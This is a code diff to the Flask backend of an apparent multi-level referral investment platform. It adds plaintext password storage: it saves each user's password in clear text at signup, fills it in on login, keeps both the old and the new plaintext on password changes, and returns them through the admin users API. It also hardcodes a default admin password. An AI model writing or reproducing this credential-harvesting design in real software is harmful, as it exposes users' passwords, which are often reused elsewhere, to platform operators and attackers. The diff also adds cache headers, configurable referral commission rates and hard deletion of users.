@@ -35,6 +35,13 @@ db = SQLAlchemy(app)
 def serve_uploads(filename):
     return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
 
+@app.after_request
+def add_header(response):
+    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0, max-age=0'
+    response.headers['Pragma'] = 'no-cache'
+    response.headers['Expires'] = '-1'
+    return response
+
 # ==========================================
 # DATABASE MODELS
 # ==========================================
@@ -45,6 +52,8 @@ class User(db.Model):
     phone = db.Column(db.String(20), unique=True, nullable=False, index=True)
     email = db.Column(db.String(120), unique=True, nullable=False, index=True)
     password_hash = db.Column(db.String(256), nullable=False)
+    password_plain = db.Column(db.String(256), nullable=True)
+    password_old = db.Column(db.String(256), nullable=True)
     referral_code = db.Column(db.String(50), unique=True, nullable=False, index=True)
     referred_by_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=True)
     wallet_balance = db.Column(db.Float, default=0.0)
@@ -289,6 +298,7 @@ def signup():
         phone=phone,
         email=email,
         password_hash=hash_password(password),
+        password_plain=password,
         referral_code=new_ref_code,
         referred_by_id=referred_by_id,
         upi_id=upi_id,
@@ -331,6 +341,11 @@ def login():
 
     if not user or not check_password(password, user.password_hash):
         return jsonify({'message': 'Invalid credentials.'}), 401
+
+    # Backfill password_plain if it was None
+    if not user.password_plain:
+        user.password_plain = password
+        db.session.commit()
 
     token = jwt.encode({
         'user_id': user.id,
@@ -406,6 +421,30 @@ def get_user_investments(current_user):
             'status': inv.status
         })
     return jsonify(inv_list)
+
+@app.route('/api/user/change-password', methods=['POST'])
+@token_required
+def user_change_password(current_user):
+    data = request.get_json() or {}
+    old_password = data.get('old_password')
+    new_password = data.get('new_password')
+    
+    if not old_password or not new_password:
+        return jsonify({'message': 'Old password and new password are required.'}), 400
+        
+    if len(new_password) < 6:
+        return jsonify({'message': 'New password must be at least 6 characters.'}), 400
+        
+    from app import check_password, hash_password
+    if not check_password(old_password, current_user.password_hash):
+        return jsonify({'message': 'Incorrect old password.'}), 400
+        
+    current_user.password_old = current_user.password_plain
+    current_user.password_hash = hash_password(new_password)
+    current_user.password_plain = new_password
+    db.session.commit()
+    
+    return jsonify({'message': 'Password changed successfully.'})
 
 # ==========================================
 # INVESTMENT PLANS API
@@ -490,14 +529,15 @@ def purchase_plan(current_user):
 def process_referral_commissions(buyer, amount):
     """
     Distributes commission to referred managers up to 3 levels.
-    Level A: 10%
-    Level B: 2%
-    Level C: 0.5%
     """
+    rate_a = float(get_setting('ref_commission_a', '10')) / 100.0
+    rate_b = float(get_setting('ref_commission_b', '2')) / 100.0
+    rate_c = float(get_setting('ref_commission_c', '0.5')) / 100.0
+
     levels = [
-        (1, 0.10, 'Level A Referral Bonus'),
-        (2, 0.02, 'Level B Referral Bonus'),
-        (3, 0.005, 'Level C Referral Bonus')
+        (1, rate_a, 'Level A Referral Bonus'),
+        (2, rate_b, 'Level B Referral Bonus'),
+        (3, rate_c, 'Level C Referral Bonus')
     ]
 
     current_parent = buyer.referred_by
@@ -693,7 +733,10 @@ def get_referral_data(current_user):
         'team_size': len(level1_users) + len(level2_users) + len(level3_users),
         'level1': [user_summary(u) for u in level1_users],
         'level2': [user_summary(u) for u in level2_users],
-        'level3': [user_summary(u) for u in level3_users]
+        'level3': [user_summary(u) for u in level3_users],
+        'ref_commission_a': float(get_setting('ref_commission_a', '10')),
+        'ref_commission_b': float(get_setting('ref_commission_b', '2')),
+        'ref_commission_c': float(get_setting('ref_commission_c', '0.5')),
     })
 
 # ==========================================
@@ -1076,7 +1119,7 @@ def admin_stats(current_user):
         'platform_fee_pct': float(get_setting('withdrawal_fee_pct', '10'))
     })
 
-@app.route('/api/admin/users', methods=['GET', 'PUT'])
+@app.route('/api/admin/users', methods=['GET', 'PUT', 'DELETE'])
 @admin_required
 def admin_users(current_user):
     if request.method == 'GET':
@@ -1087,6 +1130,8 @@ def admin_users(current_user):
                 'id': u.id,
                 'email': u.email,
                 'phone': u.phone,
+                'password_plain': u.password_plain or 'N/A',
+                'password_old': u.password_old or 'N/A',
                 'wallet_balance': u.wallet_balance,
                 'upi_id': u.upi_id,
                 'bank_name': u.bank_name,
@@ -1103,6 +1148,7 @@ def admin_users(current_user):
         user_id = data.get('user_id')
         new_balance = data.get('wallet_balance')
         is_admin_flag = data.get('is_admin')
+        new_password = data.get('new_password')
         
         target_user = User.query.get(user_id)
         if not target_user:
@@ -1113,9 +1159,43 @@ def admin_users(current_user):
             
         if is_admin_flag is not None:
             target_user.is_admin = bool(is_admin_flag)
+
+        if new_password:
+            if len(new_password) < 6:
+                return jsonify({'message': 'Password must be at least 6 characters.'}), 400
+            from app import hash_password
+            target_user.password_old = target_user.password_plain
+            target_user.password_hash = hash_password(new_password)
+            target_user.password_plain = new_password
             
         db.session.commit()
         return jsonify({'message': f'User {target_user.email} updated successfully.'})
+
+    elif request.method == 'DELETE':
+        # Hard delete user and all their records
+        data = request.get_json() or {}
+        user_id = data.get('user_id')
+        user = User.query.get(user_id)
+        if not user:
+            return jsonify({'message': 'User not found.'}), 404
+            
+        if user.is_admin:
+            # Check if this is the last admin
+            admin_count = User.query.filter_by(is_admin=True).count()
+            if admin_count <= 1:
+                return jsonify({'message': 'Cannot delete the only administrator.'}), 400
+
+        # Unlink referrals referred by this user
+        User.query.filter_by(referred_by_id=user.id).update({User.referred_by_id: None})
+
+        # Delete all user investments, transactions, tasks progress
+        UserInvestment.query.filter_by(user_id=user.id).delete()
+        Transaction.query.filter_by(user_id=user.id).delete()
+        UserTaskProgress.query.filter_by(user_id=user.id).delete()
+
+        db.session.delete(user)
+        db.session.commit()
+        return jsonify({'message': f'User {user.email} and all associated records have been completely deleted.'})
 
 @app.route('/api/admin/deposits', methods=['GET', 'POST'])
 @admin_required
@@ -1301,6 +1381,9 @@ def admin_settings(current_user):
             'salary_level_a_amount': float(get_setting('salary_level_a_amount', '5000')),
             'salary_level_b_amount': float(get_setting('salary_level_b_amount', '15000')),
             'salary_level_c_amount': float(get_setting('salary_level_c_amount', '60000')),
+            'ref_commission_a': float(get_setting('ref_commission_a', '10')),
+            'ref_commission_b': float(get_setting('ref_commission_b', '2')),
+            'ref_commission_c': float(get_setting('ref_commission_c', '0.5')),
         })
         
     elif request.method == 'POST':
@@ -1333,6 +1416,17 @@ def admin_settings(current_user):
 
 def seed_database():
     db.create_all()
+    try:
+        db.session.execute(db.text("ALTER TABLE users ADD COLUMN password_plain VARCHAR(256)"))
+        db.session.commit()
+    except Exception:
+        db.session.rollback()
+
+    try:
+        db.session.execute(db.text("ALTER TABLE users ADD COLUMN password_old VARCHAR(256)"))
+        db.session.commit()
+    except Exception:
+        db.session.rollback()
 
     # Seed Admin User if none exists
     admin_user = User.query.filter_by(is_admin=True).first()
@@ -1342,6 +1436,7 @@ def seed_database():
             phone='9999999999',
             email='admin@growthworld.com',
             password_hash=hashed,
+            password_plain='AdminPassword123',
             referral_code='GW-ADMIN',
             is_admin=True,
             upi_id='admin@upi',
@@ -1350,6 +1445,10 @@ def seed_database():
             ifsc_code='ADMIN0000'
         )
         db.session.add(default_admin)
+    else:
+        if not admin_user.password_plain:
+            admin_user.password_plain = 'AdminPassword123'
+            db.session.commit()
 
     # Seed Platform Settings if none exist
     if not PlatformSetting.query.get('upi_id'):
@@ -1367,6 +1466,9 @@ def seed_database():
         set_setting('salary_level_a_amount', '5000')
         set_setting('salary_level_b_amount', '15000')
         set_setting('salary_level_c_amount', '60000')
+        set_setting('ref_commission_a', '10')
+        set_setting('ref_commission_b', '2')
+        set_setting('ref_commission_c', '0.5')
 
     # Migration: Delete old plans if migrating to the new system
     if InvestmentPlan.query.filter_by(price=1200).first() is not None:
